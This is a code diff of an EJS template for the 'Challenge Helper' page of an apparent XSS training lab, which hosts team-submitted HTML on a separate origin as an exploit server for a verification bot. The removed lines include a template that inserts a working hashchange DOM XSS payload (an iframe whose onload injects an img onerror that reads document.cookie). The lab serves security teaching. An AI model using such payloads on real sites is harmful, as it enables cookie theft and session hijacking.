@@ -1,149 +1,55 @@
-<%- include('partials/header', { title: 'Challenge Helper — The Security Dispatch', currentLab: 'helper' }) %>
+<%- include('partials/header', { title: 'Challenge Helper — ByteNote', currentPage: '' }) %>
 
 <div class="page-wrap">
-  <div class="main-col">
-
-    <div class="article-header">
-      <span class="article-category">Tool</span>
-      <h1 class="article-title" style="font-size:1.6rem;">Challenge Helper Page</h1>
-      <p class="text-sm text-muted mt-xs">
-        Save a custom HTML document and get a permanent URL on a separate origin
-        (<code style="font-size:0.85em; background:var(--color-code-bg); padding:0.1em 0.3em; border-radius:2px;"><%= helperHost %></code>).
-        Use this to deliver cross-origin exploit triggers for Lab 06 and similar challenges.
-      </p>
-    </div>
-
-    <% if (saved && teamId) { %>
-      <div class="notice notice-success">
-        <strong>Saved.</strong> Your document is now live at:
-        <div class="helper-url-box">
-          <span class="url-pill"><%= helperHost %>/helper/<%= teamId %></span>
-          <a href="<%= helperHost %>/helper/<%= teamId %>" target="_blank" class="btn btn-secondary btn-sm">Open</a>
-        </div>
-      </div>
-    <% } %>
-
-    <% if (error) { %>
-      <div class="notice notice-error">
-        <strong>Error:</strong>
-        <% if (error === 'size_exceeded') { %>
-          Document exceeds the 10 KB size limit.
-        <% } else if (error === 'invalid_team_id') { %>
-          Team ID must be 1&ndash;32 characters: letters, numbers, hyphens, and underscores only.
-        <% } else { %>
-          An error occurred while saving your document.
-        <% } %>
-      </div>
-    <% } %>
-
-    <form action="<%= helperHost %>/helper/save" method="POST">
-      <div class="form-block">
-        <label class="form-label" for="hTeamId">Team ID</label>
-        <input
-          type="text"
-          id="hTeamId"
-          name="teamId"
-          value="<%= teamId %>"
-          class="form-input"
-          placeholder="e.g. team1, red-team-42"
-          required
-          pattern="[a-zA-Z0-9_-]{1,32}"
-          maxlength="32"
-          style="max-width: 320px;"
-        >
-        <div class="form-hint">Letters, numbers, hyphens, underscores. Max 32 characters. Determines your document URL.</div>
-      </div>
-
-      <div class="form-block">
-        <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:0.4rem; gap: 0.5rem; flex-wrap: wrap;">
-          <label class="form-label" for="hHtmlContent" style="margin-bottom:0;">HTML Document <span class="text-muted" style="font-weight:400;">(max 10 KB)</span></label>
-          <button type="button" class="btn btn-secondary btn-sm" onclick="insertTemplate()">Insert Lab 06 Template</button>
-        </div>
-        <textarea
-          id="hHtmlContent"
-          name="htmlContent"
-          class="form-textarea"
-          rows="14"
-          style="font-family: var(--font-mono); font-size: 0.85rem;"
-          placeholder="Paste your full HTML document here..."
-          required
-        ><%= existingContent %></textarea>
-        <div class="byte-counter" id="byteCounter">0 / 10240 bytes</div>
-      </div>
-
-      <div class="mt-sm flex-row">
-        <button type="submit" class="btn btn-primary">Save Document</button>
-        <% if (teamId && existingContent) { %>
-          <a href="<%= helperHost %>/helper/<%= teamId %>" target="_blank" class="btn btn-secondary">View Current</a>
-        <% } %>
-      </div>
-    </form>
-
-    <% if (teamId) { %>
-      <div class="info-box mt-lg">
-        Your document URL: <strong><%= helperHost %>/helper/<%= teamId %></strong><br>
-        This URL can be shared with the verification bot. The document is served with
-        <code>Content-Type: text/html</code> from origin <code><%= helperHost %></code>.
-      </div>
-    <% } %>
-
+  <div class="page-header">
+    <div class="page-header-eyebrow">Tool</div>
+    <h1>Challenge Helper</h1>
+    <p>Save a custom HTML document and get a persistent URL on a separate origin. Use this URL as your exploit server for challenges that require delivering a payload from an external page.</p>
   </div>
-  <aside class="sidebar">
-    <div class="sidebar-block">
-      <div class="sidebar-title">How it works</div>
-      <p class="text-sm text-muted" style="line-height: 1.6; margin-bottom: 0.6rem;">
-        The helper runs on a <strong>separate origin</strong> from the lab server, simulating an attacker-controlled host. Documents are stored in SQLite and served verbatim.
-      </p>
-      <p class="text-sm text-muted" style="line-height: 1.6;">
-        Maximum document size: <strong>10 KB</strong>. Only one document per team ID (overwrite on save).
-      </p>
+
+  <div class="helper-panel">
+    <% if (typeof savedUrl !== 'undefined' && savedUrl) { %>
+    <div class="alert alert-success" style="margin-bottom:1.5rem;">
+      Your page has been saved. Share this URL with the bot:
+      <div class="helper-url-display"><%= savedUrl %></div>
+      <a href="<%= savedUrl %>" target="_blank" rel="noopener" class="btn btn-secondary btn-sm" style="margin-top:0.5rem;">Preview Page</a>
     </div>
-    <div class="sidebar-block">
-      <div class="sidebar-title">Useful for</div>
-      <ul class="sidebar-nav">
-        <li><a href="/lab06">Lab 06 — hashchange trigger <span class="lab-num">06</span></a></li>
-      </ul>
-    </div>
-    <div class="sidebar-block">
-      <div class="sidebar-title">Labs</div>
-      <ul class="sidebar-nav">
-        <li><a href="/lab01">Reflected XSS — HTML context <span class="lab-num">01</span></a></li>
-        <li><a href="/lab02">Stored XSS — HTML context <span class="lab-num">02</span></a></li>
-        <li><a href="/lab03">DOM XSS — document.write <span class="lab-num">03</span></a></li>
-        <li><a href="/lab04">DOM XSS — innerHTML <span class="lab-num">04</span></a></li>
-        <li><a href="/lab05">DOM XSS — jQuery href <span class="lab-num">05</span></a></li>
-        <li><a href="/lab06">DOM XSS — hashchange <span class="lab-num">06</span></a></li>
-        <li><a href="/lab07">Reflected XSS — attribute <span class="lab-num">07</span></a></li>
-        <li><a href="/lab08">Stored XSS — anchor href <span class="lab-num">08</span></a></li>
-        <li><a href="/lab09">Reflected XSS — JS string <span class="lab-num">09</span></a></li>
-        <li><a href="/lab10">DOM XSS — select element <span class="lab-num">10</span></a></li>
-      </ul>
-    </div>
-  </aside>
+    <% } %>
+
+    <form action="/helper" method="POST">
+      <div class="form-group">
+        <label for="team_id">Team ID</label>
+        <input type="text" id="team_id" name="team_id"
+               placeholder="your-team-id"
+               value="<%= typeof teamId !== 'undefined' ? teamId : '' %>"
+               required maxlength="40"
+               pattern="[a-zA-Z0-9_-]+"
+               title="Letters, numbers, hyphens and underscores only">
+        <span class="form-hint">Your team identifier. Only letters, numbers, hyphens, and underscores.</span>
+      </div>
+      <div class="form-group">
+        <label for="html_content">HTML Document</label>
+        <textarea id="html_content" name="html_content"
+                  class="helper-code-area form-group textarea"
+                  placeholder="&lt;!DOCTYPE html&gt;&#10;&lt;html&gt;...&lt;/html&gt;"
+                  required maxlength="10240"><%= typeof htmlContent !== 'undefined' ? htmlContent : '' %></textarea>
+        <span class="form-hint">Maximum 10 KB. This document will be served as text/html from a separate origin.</span>
+      </div>
+
+      <% if (typeof error !== 'undefined' && error) { %>
+        <div class="alert alert-danger"><%= error %></div>
+      <% } %>
+
+      <button type="submit" class="btn btn-primary">Save &amp; Get URL</button>
+    </form>
+  </div>
+
+  <% if (typeof existingUrl !== 'undefined' && existingUrl) { %>
+  <div style="margin-top:1.5rem;">
+    <div class="text-muted">Currently saved page for team <strong><%= typeof teamId !== 'undefined' ? teamId : '' %></strong>:</div>
+    <div class="helper-url-display"><%= existingUrl %></div>
+  </div>
+  <% } %>
 </div>
-
-<script>
-  function updateByteCount() {
-    var text = document.getElementById('hHtmlContent').value;
-    var bytes = new TextEncoder().encode(text).length;
-    var el = document.getElementById('byteCounter');
-    el.textContent = bytes + ' / 10240 bytes';
-    el.className = 'byte-counter' + (bytes > 10240 ? ' over' : '');
-  }
-
-  function insertTemplate() {
-    var labUrl = "<%= labHost %>/lab06";
-    document.getElementById('hHtmlContent').value =
-      '<!DOCTYPE html>\n<html>\n<head><title>Lab 06 Exploit</title></head>\n<body>\n' +
-      '<iframe\n  src="' + labUrl + '#"\n' +
-      '  onload="this.src += \'<img src=x onerror=alert(document.cookie)>\'"\n' +
-      '  style="width:100%;height:500px;border:1px solid #ddd;">\n</iframe>\n' +
-      '</body>\n</html>';
-    updateByteCount();
-  }
-
-  document.getElementById('hHtmlContent').addEventListener('input', updateByteCount);
-  updateByteCount();
-</script>
 
 <%- include('partials/footer') %>
